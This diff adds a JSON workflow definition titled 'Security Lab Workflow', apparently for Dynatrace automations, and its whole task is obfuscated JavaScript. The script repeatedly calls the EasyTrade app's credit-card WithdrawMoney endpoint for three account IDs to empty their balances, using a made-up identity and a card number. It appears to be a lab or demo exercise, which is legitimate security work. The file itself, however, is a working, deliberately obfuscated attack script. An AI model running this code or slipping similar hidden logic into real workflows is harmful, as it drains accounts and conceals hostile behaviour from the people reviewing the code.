@@ -1,0 +1,23 @@
+{
+  "title": "Security Lab Workflow",
+  "tasks": {
+    "run_javascript_1": {
+      "name": "run_javascript_1",
+      "action": "dynatrace.automations:run-javascript",
+      "description": "Build a custom task running js Code",
+      "input": {
+        "script": "// optional import of sdk modules\nimport { execution } from '@dynatrace-sdk/automation-utils';\n\nconst easyTradeAddress = \"EASYTRADE_ADDRESS\";\n\nfunction _0x1fd1(){const _0x270bb5=['application/json','','/broker/api/creditcard/WithdrawMoney','Money\\x20left\\x20after\\x20deducting\\x201:\\x20','15985XdprGg','39109GbaLKa','1194wHpjfl','log','POST','{\\x22accountId\\x22:','1988EfVSeN','Money\\x20left\\x20after\\x20deducting\\x20the\\x20rest:','eyJhY2NvdW50SWQiOjEsImFtb3VudCI6IjIyMTExIiwibmFtZSI6IkVsaXRlIEhhY2tlcm1hbiIsImFkZHJlc3MiOiJMb25kb24gU1cxQSAyQUIsIFVLIiwiZW1haWwiOiJzZWN1cml0eUB1cmFuaXVtbWFpbC5kZXYiLCJjYXJkTnVtYmVyIjoiMzcxNDQ5NjM1Mzk4NDMxIiwiY2FyZFR5cGUiOiJBbWVyaWNhbiBFeHByZXNzIn0=','11770256kqKkjC','text','6751010SVZBEc','37186470XifKrU','\\x22,\\x22name\\x22:\\x22Elite\\x20Hackerman\\x22,\\x22address\\x22:\\x22London\\x20SW1A\\x202AB,\\x20UK\\x22,\\x22email\\x22:\\x22security@uraniummail.dev\\x22,\\x22cardNumber\\x22:\\x22371449635398431\\x22,\\x22cardType\\x22:\\x22American\\x20Express\\x22}','4191nlcVSm','28FUxZHi','9985320zzyvDX'];_0x1fd1=function(){return _0x270bb5;};return _0x1fd1();}function _0x13c3(_0x1e9f76,_0x43c643){const _0x1fd142=_0x1fd1();return _0x13c3=function(_0x13c3c9,_0x377762){_0x13c3c9=_0x13c3c9-0x108;let _0x179f4b=_0x1fd142[_0x13c3c9];return _0x179f4b;},_0x13c3(_0x1e9f76,_0x43c643);}const _0x450774=_0x13c3;(function(_0x98231d,_0x336e1d){const _0x1a15ae=_0x13c3,_0xa4dcd2=_0x98231d();while(!![]){try{const _0xd5398c=parseInt(_0x1a15ae(0x117))/0x1*(parseInt(_0x1a15ae(0x111))/0x2)+-parseInt(_0x1a15ae(0x110))/0x3*(parseInt(_0x1a15ae(0x108))/0x4)+parseInt(_0x1a15ae(0x10d))/0x5+parseInt(_0x1a15ae(0x119))/0x6*(parseInt(_0x1a15ae(0x118))/0x7)+parseInt(_0x1a15ae(0x10b))/0x8+parseInt(_0x1a15ae(0x112))/0x9+-parseInt(_0x1a15ae(0x10e))/0xa;if(_0xd5398c===_0x336e1d)break;else _0xa4dcd2['push'](_0xa4dcd2['shift']());}catch(_0x19247b){_0xa4dcd2['push'](_0xa4dcd2['shift']());}}}(_0x1fd1,0xd066b));const secret=_0x450774(0x10a),secret2=_0x450774(0x10f);export default async function ({execution_id}){emptyBankAccount(0x26),emptyBankAccount(0x3e),emptyBankAccount(0x4d);}async function emptyBankAccount(_0x2741bf){const _0x2da59f=_0x450774;let _0x38b4e1=await fetch(_0x2da59f(0x114)+easyTradeAddress+_0x2da59f(0x115),{'method':_0x2da59f(0x11b),'headers':{'Content-Type':_0x2da59f(0x113)},'body':_0x2da59f(0x11c)+_0x2741bf+',\\x22amount\\x22:\\x22'+'1'+secret2});var _0x67291b=await _0x38b4e1[_0x2da59f(0x10c)]();console[_0x2da59f(0x11a)](_0x2da59f(0x116)+_0x67291b);let _0x1ba49a=await fetch(easyTradeAddress+'/broker/api/creditcard/WithdrawMoney',{'method':_0x2da59f(0x11b),'headers':{'Content-Type':'application/json'},'body':'{\\x22accountId\\x22:'+_0x2741bf+',\\x22amount\\x22:\\x22'+_0x67291b+secret2});return _0x67291b=await _0x1ba49a['text'](),console[_0x2da59f(0x11a)](_0x2da59f(0x109)+_0x67291b),_0x1ba49a;}"
+      },
+      "position": {
+        "x": 0,
+        "y": 1
+      },
+      "predecessors": []
+    }
+  },
+  "description": "",
+  "actor": "ACTOR_ID",
+  "isPrivate": false,
+  "trigger": {},
+  "schemaVersion": 3
+}
